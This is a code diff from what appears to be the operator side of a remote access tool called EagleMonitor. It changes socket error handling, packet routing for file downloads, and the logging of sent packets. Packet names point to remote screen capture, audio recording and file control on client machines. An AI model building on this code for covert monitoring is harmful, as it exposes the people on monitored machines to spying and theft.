@@ -93,9 +93,10 @@ namespace EagleMonitor.Networking
                 else
                     return;
             }
-            catch (Exception)
+            catch (Exception ex)
             {
-                this.Dispose();
+                if (ex is SocketException)
+                    this.Dispose();
             }
         }
 
@@ -123,9 +124,11 @@ namespace EagleMonitor.Networking
 
                 return data;
             }
-            catch (Exception)
+            catch (Exception ex)
             {
-                this.Dispose();
+                if (ex is SocketException)
+                    this.Dispose();
+
                 return null;
             }
         }
@@ -154,8 +157,11 @@ namespace EagleMonitor.Networking
             {
                 return BufferPacket.DeserializePacket(Utils.Miscellaneous.settings.key);//, out packetSize);
             }
-            catch (Exception)
+            catch (Exception ex)
             {
+                if (ex is SocketException)
+                    this.Dispose();
+
                 return null;
             }
         }
@@ -205,6 +211,10 @@ namespace EagleMonitor.Networking
                             new PacketHandler(packet, this);
                             break;
 
+                        case PacketType.FM_DOWNLOAD_FILE:
+                            new PacketHandler(packet, this);
+                            break;
+
                         default:
                             new PacketHandler(packet, ClientHandler.ClientHandlersList[packet.baseIp]);
                             this.Dispose();
@@ -212,10 +222,10 @@ namespace EagleMonitor.Networking
                     }
                 }
             }
-            catch (Exception)// ex)
+            catch(Exception ex)
             {
-                //MessageBox.Show(ex.ToString());
-                this.Dispose();
+                if(ex is SocketException)
+                    this.Dispose();
             }
         }
 
@@ -275,7 +285,7 @@ namespace EagleMonitor.Networking
                     return data;
                 }
             }
-            catch { return null; }
+            catch{ return null; }
         }
         private void SendDataCompleted(IAsyncResult ar)
         {
@@ -286,63 +296,51 @@ namespace EagleMonitor.Networking
                 packet.status = "SENT";
                 packet.datePacketStatus = DateTime.Now.ToString();
             }
-            else 
+            else
             {
-                packet.status = "NOT SENT";
-            }
-
-            IAsyncResult res = Program.logForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
-            {
-                int rowId = Program.logForm.dataGridView1.Rows.Add();
-                DataGridViewRow row = Program.logForm.dataGridView1.Rows[rowId];
-                row.Cells["Column1"].Value = packet.HWID;
-                row.Cells["Column2"].Value = packet.baseIp;
-                row.Cells["Column3"].Value = packet.packetType.ToString();
-                row.Cells["Column4"].Style.ForeColor = Color.FromArgb(66, 182, 245);
-                row.Cells["Column4"].Value = packet.status;
-                row.Cells["Column6"].Value = packet.datePacketStatus;
-
-                switch (packet.packetType)
+                IAsyncResult res = Program.logForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
                 {
-                    case PacketType.FM_DOWNLOAD_FILE:
-                        row.Cells["Column5"].Value = ((DownloadFilePacket)packet).fileName;
-                        break;
+                    try
+                    {
+                        int rowId = Program.logForm.dataGridView1.Rows.Add();
+                        DataGridViewRow row = Program.logForm.dataGridView1.Rows[rowId];
+                        row.Cells["Column1"].Value = packet.HWID;
+                        row.Cells["Column2"].Value = packet.baseIp;
+                        row.Cells["Column3"].Value = packet.packetType.ToString();
+                        row.Cells["Column4"].Style.ForeColor = Color.FromArgb(66, 182, 245);
+                        row.Cells["Column4"].Value = packet.status;
+                        row.Cells["Column6"].Value = packet.datePacketStatus;
 
-                    case PacketType.FM_DELETE_FILE:
-                        row.Cells["Column5"].Value = ((DeleteFilePacket)packet).path;
-                        break;
+                        switch (packet.packetType)
+                        {
+                            case PacketType.FM_DOWNLOAD_FILE:
+                                row.Cells["Column5"].Value = ((DownloadFilePacket)packet).fileName;
+                                break;
 
-                    case PacketType.FM_START_FILE:
-                        row.Cells["Column5"].Value = ((StartFilePacket)packet).filePath;
-                        break;
+                            case PacketType.FM_DELETE_FILE:
+                                row.Cells["Column5"].Value = ((DeleteFilePacket)packet).path;
+                                break;
 
-                    case PacketType.FM_GET_FILES_AND_DIRS:
-                        row.Cells["Column5"].Value = ((FileManagerPacket)packet).path;
-                        break;
-                }
-            }));
+                            case PacketType.FM_START_FILE:
+                                row.Cells["Column5"].Value = ((StartFilePacket)packet).filePath;
+                                break;
 
-            Program.logForm.dataGridView1.EndInvoke(res);
+                            case PacketType.FM_GET_FILES_AND_DIRS:
+                                row.Cells["Column5"].Value = ((FileManagerPacket)packet).path;
+                                break;
+                        }
+                    }
+                    catch {}
 
-            if (packet.packetType == PacketType.RC_CAPTURE_OFF || packet.packetType == PacketType.AUDIO_RECORD_OFF || packet.packetType == PacketType.RM_VIEW_OFF || packet.packetType == PacketType.CHAT_OFF)
-            {
-                this.Dispose();
+                }));
+
+                Program.logForm.dataGridView1.EndInvoke(res);
+                packet = null;
             }
-            packet = null;
         }
 
         public void Dispose()
         {
-            /*if (socket != null)
-            {
-                MessageBox.Show("??");
-                socket.Shutdown(SocketShutdown.Both);
-                MessageBox.Show("???");
-                socket.Close();
-                MessageBox.Show("????");
-                socket.Dispose();
-                socket = null;
-            }*/
             try
             {
                 socket.Shutdown(SocketShutdown.Both);
